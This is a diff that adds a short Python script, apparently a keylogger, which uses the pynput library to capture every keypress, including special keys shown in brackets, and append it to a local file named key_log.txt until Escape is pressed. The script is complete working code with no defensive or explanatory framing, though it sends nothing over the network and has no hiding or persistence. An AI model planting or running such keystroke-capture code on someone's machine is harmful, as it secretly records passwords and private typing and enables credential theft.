@@ -1,0 +1,27 @@
+from pynput import keyboard
+
+# File to save the keystrokes
+log_file = "key_log.txt"
+
+ #This function is called whenever a key is pressed.
+def on_press(key):
+#It writes the character to the log file. 
+    try:
+        # Write the key to the log file
+        with open(log_file, "a") as f:
+            f.write(f"{key.char}")
+#If the key is a special key (e.g., Ctrl, Alt), it writes the key name in brackets.            
+    except AttributeError:
+        # Handle special keys
+        with open(log_file, "a") as f:
+            f.write(f" [{key}] ")
+
+#This function stops the listener when the Escape key is pressed.                     
+def on_release(key):
+    # Stop listener when the escape key is pressed
+    if key == keyboard.Key.esc:
+        return False
+
+# Setup the listener
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
